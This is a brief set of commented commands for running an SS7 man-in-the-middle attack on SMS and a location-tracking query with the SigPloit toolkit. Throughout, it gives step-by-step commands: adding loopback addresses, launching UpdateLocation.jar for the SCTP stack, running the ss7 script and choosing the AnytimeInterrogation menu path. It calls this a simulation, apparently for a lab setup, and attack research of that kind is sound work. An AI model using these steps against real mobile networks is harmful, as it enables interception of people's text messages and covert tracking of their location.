#This code aims to simulate a full man in the middle attack for SMS 
#This code simulates the HLR of target to receive the fake update location
#This code simulates an SMSC to deliever an SMS to the attacker
#This coode simulates the legtimite MSC of target prior to the fake update location to forward the intercepted SMS

# You need to add the ip address to the terminal machine to launnch the attack

sudo ip address add 192.168.56.101/32 dev lo
sudo ip address add 192.168.56.102/32 dev lo

# Run the java file to initiate the SCTP stack.

sudo java -jar UpdateLocation.jar

# after initiating the stcp stack go back to the SigPloit-SS7 so that we can run SS7 python file.

python2 ss7

# For performing the attack we need to follow step -> SS7 -> Location Tracking -> AnytimeInterrogation
sig> 0  
(Attacks)> 1
(LocationTracking)> 0

# then you write the hardcoded values.
